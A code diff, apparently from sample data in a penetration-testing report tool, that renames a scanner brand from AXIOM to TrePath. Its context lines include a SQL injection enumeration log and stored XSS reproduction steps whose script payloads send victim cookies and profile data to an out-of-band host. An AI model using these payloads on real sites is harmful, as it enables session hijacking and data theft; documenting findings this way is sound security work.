@@ -133,7 +133,7 @@ requests:
       {
         id: "ce-001-3", label: "Schema Enumeration — Tables Discovered",
         type: "log-snippet",
-        content: `[14:22:07] AXIOM SQLi Plugin — Starting UNION detection on /api/products/search
+        content: `[14:22:07] TrePath SQLi Plugin — Starting UNION detection on /api/products/search
 [14:22:08] Probe 1/4: Single quote — HTTP 500 (SQL error detected)
 [14:22:08] Probe 2/4: ORDER BY 1-- — HTTP 200 (no change)
 [14:22:09] Probe 3/4: ORDER BY 5-- — HTTP 500 (column count = 4 confirmed)
@@ -166,7 +166,7 @@ requests:
       reproductionSteps: [
         "Login as attacker account",
         "PUT /api/profile/update with displayName: <script>fetch('//ax1m9f3k.axiom-oob.io?c='+document.cookie)</script>",
-        "Check AXIOM OOB Monitor for HTTP interaction",
+        "Check TrePath OOB Monitor for HTTP interaction",
         "Login as victim, navigate to attacker profile — victim cookie delivered to OOB server",
       ],
     },
@@ -211,7 +211,7 @@ curl -s "https://app.target.local/api/profile/attacker-id" \\
     .then(r => r.json())
     .then(data => fetch('https://ax1m9f3k.axiom-oob.io/data?d=' + btoa(JSON.stringify(data))));
 </script>`,
-      expectedResult: "AXIOM OOB Monitor receives HTTP GET request containing victim session cookie within seconds of victim loading the attacker's profile page.",
+      expectedResult: "TrePath OOB Monitor receives HTTP GET request containing victim session cookie within seconds of victim loading the attacker's profile page.",
       severity: "Critical — CVSS 9.0",
     },
     collectedEvidence: [
